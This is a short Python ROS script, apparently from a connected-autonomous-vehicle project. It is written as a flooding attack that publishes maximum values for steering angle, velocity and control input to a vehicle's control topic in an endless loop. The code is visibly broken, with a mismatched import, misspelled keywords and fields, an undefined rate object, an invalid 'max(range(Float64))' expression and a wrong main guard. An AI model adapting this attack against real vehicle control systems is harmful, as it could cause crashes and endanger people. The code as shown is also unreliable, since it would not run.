# mama im chasing a ghost
# i dont know who he is

import rospy #i cant test this cause i do not have dual boot. wonderful
from std_msgs.msg import Float64
from cav_project.msg import Controlinfo

def flood():
    #initialize ROS node
    rospy.init_node('ddos_attack_node', annonymous = True)

    #publisher 
    bad_actor = '/control_info_1' #Change the one to alter the control info sent for that cav...
    pub = rospy.Publisher(bad_actor, ControlInfo, queue_size = 10)

    max_float64 = max(range(Float64))
    
    while not rospy.is_shutdown(): # this could be changed to be a time condition, i.e, only ran for a short period of time
        flood_msg = ControlInfo()
        flood_msg.steering_angel = max_float64
        flood_msg.desired_velocity = max_float64
        flood_msg.control_input = max_float64

        pub.publish(flood_msg)
        rate.sleep()

if __name__ == 'main':
    try:
        flood()
    except rospy.ROSInterruptException:
        pass 
